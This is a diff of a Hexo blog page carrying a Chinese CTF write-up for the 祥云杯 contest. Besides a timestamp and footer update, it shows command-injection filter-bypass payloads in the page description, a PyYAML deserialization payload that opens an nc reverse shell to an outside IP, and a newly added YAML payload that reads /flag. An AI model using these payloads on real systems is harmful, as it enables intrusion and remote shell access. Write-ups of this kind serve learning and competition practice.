@@ -27,7 +27,7 @@
 <meta property="og:image" content="http://yoursite.com/images/%E7%A5%A5%E4%BA%91%E6%9D%AF/image-20201122172052236.png">
 <meta property="og:image" content="http://yoursite.com/images/%E7%A5%A5%E4%BA%91%E6%9D%AF/image-20201122173146743.png">
 <meta property="og:image" content="http://yoursite.com/images/%E7%A5%A5%E4%BA%91%E6%9D%AF/image-20201122172851925.png">
-<meta property="og:updated_time" content="2020-11-29T06:52:39.714Z">
+<meta property="og:updated_time" content="2020-12-05T06:23:31.888Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="祥云杯">
 <meta name="twitter:description" content="Web1 Command一道ping的命令执行|没有被过滤，使用||拼接命令，使用%09代替空格，过滤了许多读文件的命令，可以使用/bin/ca?绕过，过滤了*，尝试使用find /遍历目录。 1111||find%09/   发现flag 2333，过滤了*，使用?代替。 1111||/bin/ca?%09/etc/.find????/????.txt">
@@ -265,6 +265,8 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [&quot;\x5f\x5fimport\x5f\x5f(&apos;os&apos;)\x2esystem(&apos;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 8\x2e129\x2e69\x2e85 2333 &gt;/tmp/f&apos;)&quot;]]]</span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/%E7%A5%A5%E4%BA%91%E6%9D%AF/image-20201122172851925.png" alt="image-20201122172851925"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yaml=!!python/object/new:subprocess.check_output [[&quot;cat&quot;,&quot;/flag&quot;]]</span><br></pre></td></tr></table></figure>
+
 
       
 
@@ -427,7 +429,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2020 Ycj
+    		&copy; 2021 Ycj
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
